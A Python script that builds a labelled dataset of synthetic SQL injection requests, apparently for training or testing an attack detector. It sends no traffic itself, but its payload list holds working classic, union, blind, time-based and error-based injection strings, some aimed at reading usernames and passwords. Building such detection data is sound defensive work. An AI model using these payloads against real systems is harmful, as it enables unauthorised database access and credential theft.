"""SQL Injection Attack Traffic Generator.

Generates labeled SQL injection attack requests for testing.
"""

import json
import uuid
import time
from datetime import datetime
from pathlib import Path


# SQL Injection payloads organized by technique
SQLI_PAYLOADS = {
    "classic": [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "admin'--",
        "admin' #",
        "' OR ''='",
        "' OR ''=''",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
    ],
    "union": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "1 UNION SELECT username,password FROM users--",
        "' UNION SELECT 1,2,3 FROM dual--",
    ],
    "blind": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND SUBSTRING(username,1,1)='a'--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--",
        "1; SELECT SLEEP(5)--",
        "' AND BENCHMARK(10000000,SHA1('test'))--",
        "'; SELECT pg_sleep(5)--",
    ],
    "error_based": [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ],
}

# Endpoints that accept parameters
TARGET_ENDPOINTS = [
    "/search",
    "/products",
    "/login",
    "/admin",
]


def generate_sqli_requests(num_requests: int = 100) -> list[dict]:
    """Generate SQL injection attack requests."""
    requests = []
    timestamp = time.time()
    techniques = list(SQLI_PAYLOADS.keys())

    for i in range(num_requests):
        technique = techniques[i % len(techniques)]
        payload = SQLI_PAYLOADS[technique][i % len(SQLI_PAYLOADS[technique])]
        endpoint = TARGET_ENDPOINTS[i % len(TARGET_ENDPOINTS)]

        # Vary the injection point
        if endpoint == "/login":
            path = "/login"
            query_string = ""
            body_fields = ["username", "password"]
            body = f"username={payload}&password=test"
            method = "POST"
        elif endpoint == "/search":
            path = "/search"
            query_string = f"q={payload}"
            body_fields = []
            body = ""
            method = "GET"
        elif endpoint == "/products":
            path = "/products"
            query_string = f"id={payload}"
            body_fields = []
            body = ""
            method = "GET"
        else:
            path = endpoint
            query_string = f"q={payload}"
            body_fields = []
            body = ""
            method = "GET"

        requests.append({
            "request_id": f"REQ-SQLI-{uuid.uuid4().hex[:8].upper()}",
            "timestamp": datetime.fromtimestamp(timestamp).isoformat(),
            "method": method,
            "path": path,
            "query_string": query_string,
            "query": {"q": payload} if query_string else {},
            "headers": {
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                "content-type": "application/x-www-form-urlencoded" if body else "",
            },
            "body_fields": body_fields,
            "body_size": len(body.encode()) if body else 0,
            "session_id": f"S-ATTACK-{uuid.uuid4().hex[:6].upper()}",
            "source_id": f"ATTACKER-{uuid.uuid4().hex[:4].upper()}",
            "content_type": "application/x-www-form-urlencoded" if body else "",
            "label": "ATTACK",
            "attack_type": "SQL_INJECTION",
            "technique": technique,
            "payload": payload,
        })

        timestamp += 0.1

    return requests


def save_dataset(requests: list[dict], filepath: str):
    """Save attack requests to JSONL."""
    Path(filepath).parent.mkdir(parents=True, exist_ok=True)
    with open(filepath, "w") as f:
        for req in requests:
            f.write(json.dumps(req) + "\n")
    print(f"Saved {len(requests)} SQLi requests to {filepath}")


if __name__ == "__main__":
    requests = generate_sqli_requests(100)
    save_dataset(requests, "data/raw/attacks/sqli.jsonl")
